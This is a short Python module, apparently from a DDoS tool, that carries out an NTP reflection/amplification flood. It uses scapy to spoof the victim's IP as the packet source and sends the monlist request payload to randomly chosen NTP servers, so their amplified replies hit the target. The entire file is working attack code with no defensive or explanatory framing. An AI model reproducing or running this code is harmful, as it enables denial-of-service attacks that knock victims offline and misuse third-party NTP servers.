# Import modules
import random
from socket import gaierror

from colorama import Fore
from scapy.all import IP, UDP, Raw, send

# Load NTP servers list
with open("impulse/L4/ntp_servers.txt") as f:
    ntp_servers = f.readlines()

# Payload
payload = "\x17\x00\x03\x2a" + "\x00" * 4


def flood(target):
    server = random.choice(ntp_servers)
    # Packet
    packets = random.randint(10, 150)
    server = server.replace("\n", "")

    try:
        packet = (
            IP(dst=server, src=target[0])
            / UDP(sport=random.randint(2000, 65535), dport=int(target[1]))
            / Raw(load=payload)
        )
        send(packet, count=packets, verbose=False)
    except gaierror:
        print(
            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}",
        )
    except Exception as e:
        print(
            f"{Fore.MAGENTA}Error while sending NTP packet\n{Fore.MAGENTA}{e}{Fore.RESET}",
        )
    else:
        print(
            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}",
        )
